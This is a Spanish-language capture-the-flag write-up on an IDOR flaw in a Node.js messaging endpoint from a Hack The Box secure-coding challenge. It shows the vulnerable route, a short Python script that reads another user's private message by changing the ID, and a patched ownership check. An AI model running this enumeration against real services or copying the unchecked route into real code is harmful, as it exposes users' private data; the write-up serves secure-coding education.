---
title: "HTB Secure Coding S10 — CommNet: IDOR en Mensajes"
date: 2026-04-20
description: "Writeup de CommNet (HTB Secure Coding Season 10). IDOR (CWE-639) en el endpoint de mensajes permite leer mensajes privados de otros usuarios al modificar el ID en la URL sin verificación de ownership."
excerpt: "IDOR en GET /messages/:id — el endpoint verifica autenticación pero no ownership, permitiendo leer mensajes privados del admin."
tags: ["HTB", "Secure Coding", "Web", "IDOR", "CWE-639", "Node.js", "SQLite", "Authorization"]
platform: "HTB"
difficulty: "Easy"
image: "/images/blog/htb-commnet.png"
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Season](https://img.shields.io/badge/Season-10-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

> **Disclaimer:** Writeup realizado en entorno autorizado de Hack The Box con fines educativos. Enfoque *Secure Coding* — identificar, explotar y parchear vulnerabilidades en código fuente.

---

| Campo | Valor |
|-------|-------|
| Challenge | CommNet |
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | IDOR — Insecure Direct Object Reference (CWE-639) |
| Stack | Node.js / Express / SQLite |

## Descripción

Plataforma de mensajería entre usuarios. El endpoint `GET /messages/:id` requiere autenticación pero no verifica ownership del mensaje.

## Vulnerabilidad

```javascript
// VULNERABLE — routes/messages.js
router.get('/:id', requireAuth, (req, res) => {
    const messageId = req.params.id;
    // Sin verificar sender_id ni recipient_id
    req.db.get(`
        SELECT m.* FROM messages m
        WHERE m.id = ?    -- solo filtra por ID
    `, [messageId], ...);
});
```

## Exploit

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"
s = requests.Session()

s.post(f"{BASE}/api/auth/register",
    json={"username":"h","email":"h@t.com","password":"h","enclave":"West"})
s.post(f"{BASE}/api/auth/login", json={"username":"h","password":"h"})

# Acceder a mensaje de admin sin ser sender ni recipient
r = s.get(f"{BASE}/api/messages/3")
print(r.json()["message"]["content"])  # → flag
```

## Parche

```javascript
// routes/messages.js — GET /:id
router.get('/:id', requireAuth, (req, res) => {
    const messageId = req.params.id;
    const userId = req.session.userId;  // ← ownership check

    req.db.get(`
        SELECT m.*,
               sender.username    AS sender_username,
               recipient.username AS recipient_username
        FROM messages m
        LEFT JOIN users sender    ON m.sender_id    = sender.id
        LEFT JOIN users recipient ON m.recipient_id = recipient.id
        WHERE m.id = ?
          AND (m.sender_id = ? OR m.recipient_id = ? OR m.recipient_id IS NULL)
    `, [messageId, userId, userId], (err, message) => {
        if (err || !message) {
            return res.status(404).json({ success: false, error: 'Message not found' });
        }
        res.json({ success: true, message });
    });
});
```

La cláusula `AND` asegura que solo el sender, el recipient, o mensajes broadcast (`recipient_id IS NULL`) son accesibles.

## Key Takeaways

1. **Authorization ≠ Authentication** — `requireAuth` verifica que el usuario está logueado. El ownership check verifica que puede acceder a *ese* recurso específico.
2. **El WHERE clause es el control de acceso** — en operaciones sobre recursos de usuario, siempre incluir el `userId` del request en el filtro SQL.
3. **IDs secuenciales facilitan IDOR** — si se usan IDs predecibles, el ownership check en SQL es la única barrera.

---

<div align="center">

**Flippermen**
*HackTheBox Season 10 — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
